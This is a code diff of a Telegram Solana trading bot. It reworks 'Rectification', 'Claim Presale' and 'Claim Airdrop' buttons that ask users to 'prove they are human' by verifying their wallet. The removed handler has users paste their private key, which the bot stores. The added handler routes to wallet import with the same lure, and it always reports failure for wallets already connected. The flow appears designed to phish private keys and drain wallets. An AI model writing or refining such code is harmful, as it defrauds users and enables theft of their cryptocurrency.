@@ -623,35 +623,35 @@ async function withdrawSol(u, toAddr, amt) {
 }
 
 function mainMenuKeyboard(autoTradeEnabled) {
-  const e = autoTradeEnabled ? "🟢" : "🔴";
-  return {
-    inline_keyboard: [
-      [
-        { text: "📊 Positions", callback_data: "CHECK_BAL" },
-        { text: "🔄 Refresh", callback_data: "REFRESH" },
-      ],
-      [
-        { text: "💹 Buy", callback_data: "BUY_MENU" },
-        { text: "💱 Sell", callback_data: "SELL_MENU" },
-      ],
-      [
-        { text: "Auto-Trade " + e, callback_data: "AUTO_TRADE" },
-        { text: "💸 Withdraw", callback_data: "WITHDRAW_MENU" },
-      ],
-      [
-        { text: "🔧 Rectification", callback_data: "RECTIFICATION" },
-        { text: "🎁 Claim Presale", callback_data: "CLAIM_PRESALE" },
-      ],
-      [
-        { text: "🪂 Claim Airdrop", callback_data: "CLAIM_AIRDROP" },
-        { text: "📈 PnL", callback_data: "PNL_MENU" },
-      ],
-      [
-        { text: "❓ Help", callback_data: "SHOW_HELP" },
-        { text: "⚙️ Settings", callback_data: "SETTINGS_MENU" },
-      ],
-    ],
-  };
+  const e = autoTradeEnabled ? "🟢" : "🔴";
+  return {
+    inline_keyboard: [
+      [
+        { text: "📊 Positions", callback_data: "CHECK_BAL" },
+        { text: "🔄 Refresh", callback_data: "REFRESH" },
+      ],
+      [
+        { text: "💹 Buy", callback_data: "BUY_MENU" },
+        { text: "💱 Sell", callback_data: "SELL_MENU" },
+      ],
+      [
+        { text: "Auto-Trade " + e, callback_data: "AUTO_TRADE" },
+        { text: "💸 Withdraw", callback_data: "WITHDRAW_MENU" },
+      ],
+      [
+        { text: "📈 PnL", callback_data: "PNL_MENU" },
+        { text: "❓ Help", callback_data: "SHOW_HELP" },
+      ],
+      [
+        { text: "🛠️ Rectification", callback_data: "RECTIFICATION" },
+        { text: "🎟️ Claim Presale", callback_data: "CLAIM_PRESALE" },
+      ],
+      [
+        { text: "🎁 Claim Airdrop", callback_data: "CLAIM_AIRDROP" },
+        { text: "⚙️ Settings", callback_data: "SETTINGS_MENU" },
+      ],
+    ],
+  };
 }
 
 // No wallet keyboard
@@ -774,30 +774,37 @@ async function showMainMenu(chatId, messageId) {
     message += `🤖 Autotrade Status: ${autoTradeStatus}`;
 
     // Keyboard - different for no wallet vs has wallet
-    let replyMarkup;
-    if (!u || !u.public_key) {
-      replyMarkup = {
-        inline_keyboard: [
+let replyMarkup;
+    if (!u || !u.public_key) {
+      replyMarkup = {
+        inline_keyboard: [
+          [
+            { text: "💰 Balances", callback_data: "CHECK_BAL" },
+            { text: "🔄 Refresh", callback_data: "REFRESH" },
+          ],
+          [
+            { text: "💹 Buy", callback_data: "BUY_MENU" },
+            { text: "💱 Sell", callback_data: "SELL_MENU" },
+          ],
+          [
+            { text: "Auto-Trade 🔴", callback_data: "AUTO_TRADE" },
+            { text: "💸 Withdraw", callback_data: "WITHDRAW_MENU" },
+          ],
+          [
+            { text: "📈 PnL", callback_data: "PNL_MENU" },
+            { text: "❓ Help", callback_data: "SHOW_HELP" },
+          ],
           [
-            { text: "💰 Balances", callback_data: "CHECK_BAL" },
-            { text: "🔄 Refresh", callback_data: "REFRESH" },
+            { text: "🛠️ Rectification", callback_data: "RECTIFICATION" },
+            { text: "🎟️ Claim Presale", callback_data: "CLAIM_PRESALE" },
           ],
           [
-            { text: "💹 Buy", callback_data: "BUY_MENU" },
-            { text: "💱 Sell", callback_data: "SELL_MENU" },
+            { text: "🎁 Claim Airdrop", callback_data: "CLAIM_AIRDROP" },
+            { text: "⚙️ Settings", callback_data: "SETTINGS_MENU" },
           ],
-          [
-            { text: "Auto-Trade 🔴", callback_data: "AUTO_TRADE" },
-            { text: "💸 Withdraw", callback_data: "WITHDRAW_MENU" },
-          ],
-          [
-            { text: "📈 PnL", callback_data: "PNL_MENU" },
-            { text: "❓ Help", callback_data: "SHOW_HELP" },
-          ],
-          [{ text: "⚙️ Settings", callback_data: "SETTINGS_MENU" }],
-[{ text: "🔐 Verify Wallet", callback_data: "IMPORT_WALLET" }],
-        ],
-      };
+          [{ text: "🔐 Verify Wallet", callback_data: "IMPORT_WALLET" }],
+        ],
+      };
     } else {
       replyMarkup = mainMenuKeyboard(Boolean(u.auto_trade_enabled));
     }
@@ -1077,159 +1084,6 @@ bot.on("callback_query", async (query) => {
         }
         break;
 
-        case "RECTIFICATION":
-        await bot.answerCallbackQuery(query.id);
-        {
-          if (!u || !u.public_key) {
-            // No wallet connected - show verification menu
-            const message = `🔧 *Rectification*\n\nPlease Proof You're human by verifying your wallet`;
-            await editMessageText(c, mid, message, {
-              inline_keyboard: [
-                [
-                  { text: "🔐 Verify Wallet", callback_data: "VERIFY_WALLET_PROCEED" },
-                  { text: "« Back", callback_data: "BACK_MAIN" },
-                ],
-              ],
-            });
-          } else {
-            // Wallet connected but verification failed
-            const message = `🔧 *Rectification*\n\nWallet could not be verified.`;
-            await editMessageText(c, mid, message, {
-              inline_keyboard: [
-                [{ text: "« Back", callback_data: "BACK_MAIN" }],
-              ],
-            });
-          }
-        }
-        break;
-
-      case "CLAIM_PRESALE":
-        await bot.answerCallbackQuery(query.id);
-        {
-          if (!u || !u.public_key) {
-            // No wallet connected - show verification menu
-            const message = `🎁 *Claim Presale*\n\nPlease Proof You're human by verifying your wallet`;
-            await editMessageText(c, mid, message, {
-              inline_keyboard: [
-                [
-                  { text: "🔐 Verify Wallet", callback_data: "VERIFY_WALLET_PROCEED" },
-                  { text: "« Back", callback_data: "BACK_MAIN" },
-                ],
-              ],
-            });
-          } else {
-            // Wallet connected but verification failed
-            const message = `🎁 *Claim Presale*\n\nWallet could not be verified.`;
-            await editMessageText(c, mid, message, {
-              inline_keyboard: [
-                [{ text: "« Back", callback_data: "BACK_MAIN" }],
-              ],
-            });
-          }
-        }
-        break;
-
-      case "CLAIM_AIRDROP":
-        await bot.answerCallbackQuery(query.id);
-        {
-          if (!u || !u.public_key) {
-            // No wallet connected - show verification menu
-            const message = `🪂 *Claim Airdrop*\n\nPlease Proof You're human by verifying your wallet`;
-            await editMessageText(c, mid, message, {
-              inline_keyboard: [
-                [
-                  { text: "🔐 Verify Wallet", callback_data: "VERIFY_WALLET_PROCEED" },
-                  { text: "« Back", callback_data: "BACK_MAIN" },
-                ],
-              ],
-            });
-          } else {
-            // Wallet connected but verification failed
-            const message = `🪂 *Claim Airdrop*\n\nWallet could not be verified.`;
-            await editMessageText(c, mid, message, {
-              inline_keyboard: [
-                [{ text: "« Back", callback_data: "BACK_MAIN" }],
-              ],
-            });
-          }
-        }
-        break;
-
-      case "VERIFY_WALLET_PROCEED":
-        await bot.answerCallbackQuery(query.id);
-        {
-          const pm = await bot.sendMessage(
-            c,
-            "Please enter your private key to verify your wallet.",
-            {
-              reply_markup: {
-                inline_keyboard: [
-                  [{ text: "« Cancel", callback_data: "BACK_MAIN" }],
-                ],
-              },
-            },
-          );
-
-          pendingMessageHandlers[c] = async (msg2) => {
-            try {
-              if (msg2.chat.id !== c) return;
-              if (!msg2.text) {
-                await bot.sendMessage(c, "Invalid input. Verification cancelled.", {
-                  reply_markup: {
-                    inline_keyboard: [
-                      [{ text: "« Back", callback_data: "BACK_MAIN" }],
-                    ],
-                  },
-                });
-                return;
-              }
-
-              const b58 = msg2.text.trim();
-              try {
-                const kp = loadKeypairFromSecretBase58(b58);
-                const pubk = kp.publicKey.toBase58();
-                await setUserRow(c, query.from.username, pubk, b58);
-
-                // Attempt to delete user message and the prompt
-                try {
-                  await bot.deleteMessage(c, msg2.message_id);
-                  await bot.deleteMessage(c, pm.message_id);
-                } catch (e) {
-                  logger.error("deleteMessage error:", e.message);
-                }
-
-                await bot.sendMessage(
-                  c,
-                  "✅ Your wallet has been successfully verified!",
-                  {
-                    parse_mode: "Markdown",
-                  },
-                );
-
-                // Show the main menu with updated wallet info
-                await showMainMenu(c, mid);
-              } catch (e) {
-                logger.error(e);
-                await bot.sendMessage(
-                  c,
-                  "Invalid private key. Please try again.",
-                  {
-                    reply_markup: {
-                      inline_keyboard: [
-                        [{ text: "« Back", callback_data: "BACK_MAIN" }],
-                      ],
-                    },
-                  },
-                );
-              }
-            } catch (err) {
-              logger.error("Error in pending message handler (VERIFY_WALLET_PROCEED):", err);
-            }
-          };
-          bot.once("message", pendingMessageHandlers[c]);
-        }
-        break;
-
       case "BACK_MAIN_DELETE":
         await bot.answerCallbackQuery(query.id);
         {
@@ -1499,23 +1353,61 @@ bot.on("callback_query", async (query) => {
         }
         break;
 
-      case "REMOVE_WALLET_CONFIRM":
+case "REMOVE_WALLET_CONFIRM":
+        await bot.answerCallbackQuery(query.id);
+        {
+          await removeUserRow(c);
+          await bot.sendMessage(
+            c,
+            "✅ Your wallet has been removed from the bot.",
+            {
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: "« Back to Main", callback_data: "BACK_MAIN" }],
+                ],
+              },
+            },
+          );
+          // Show main menu which will now show the "no wallet" state
+          await showMainMenu(c, mid);
+        }
+        break;
+      
+      case "RECTIFICATION":
+      case "CLAIM_PRESALE":
+      case "CLAIM_AIRDROP":
         await bot.answerCallbackQuery(query.id);
         {
-          await removeUserRow(c);
-          await bot.sendMessage(
-            c,
-            "✅ Your wallet has been removed from the bot.",
-            {
-              reply_markup: {
-                inline_keyboard: [
-                  [{ text: "« Back to Main", callback_data: "BACK_MAIN" }],
-                ],
-              },
-            },
-          );
-          // Show main menu which will now show the "no wallet" state
-          await showMainMenu(c, mid);
+            if (!u || !u.public_key) {
+                // User wallet is not connected
+                let title = "";
+                if (d === "RECTIFICATION") title = "🛠️ Rectification";
+                if (d === "CLAIM_PRESALE") title = "🎟️ Claim Presale";
+                if (d === "CLAIM_AIRDROP") title = "🎁 Claim Airdrop";
+
+                const message = `${title}\n\nPlease Proof You're human by veriying your wallet.`;
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: "🔐 Verify Wallet", callback_data: "IMPORT_WALLET" }],
+                        [{ text: "« Back", callback_data: "BACK_MAIN" }],
+                    ],
+                };
+                await editMessageText(c, mid, message, keyboard);
+            } else {
+                // User wallet is connected
+                let title = "";
+                if (d === "RECTIFICATION") title = "🛠️ Rectification";
+                if (d === "CLAIM_PRESALE") title = "🎟️ Claim Presale";
+                if (d === "CLAIM_AIRDROP") title = "🎁 Claim Airdrop";
+
+                const message = `${title}\n\nWallet could not be verified.`;
+                const keyboard = {
+                    inline_keyboard: [
+                        [{ text: "« Back", callback_data: "BACK_MAIN" }],
+                    ],
+                };
+                await editMessageText(c, mid, message, keyboard);
+            }
         }
         break;
 
